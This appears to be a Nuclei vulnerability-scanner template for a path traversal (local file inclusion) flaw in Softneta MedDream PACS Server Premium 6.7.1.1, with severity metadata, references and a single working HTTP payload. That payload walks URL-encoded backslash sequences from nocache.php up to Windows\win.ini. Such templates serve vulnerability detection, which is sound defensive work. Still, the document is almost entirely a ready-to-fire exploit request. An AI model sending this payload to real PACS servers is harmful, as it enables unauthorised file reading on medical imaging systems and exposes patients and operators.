# Nuclei Template: Softneta MedDream PACS Server Premium 6.7.1.1 - Local File Inclusion
**Template ID:** sofneta-mecdream-pacs-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`sofneta-mecdream-pacs-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Softneta MedDream PACS Server Premium 6.7.1.1 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/pacs/nocache.php?path=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini
```

## References
- https://www.exploit-db.com/exploits/45347
- https://www.softneta.com/products/meddream-pacs-server/downloads.html
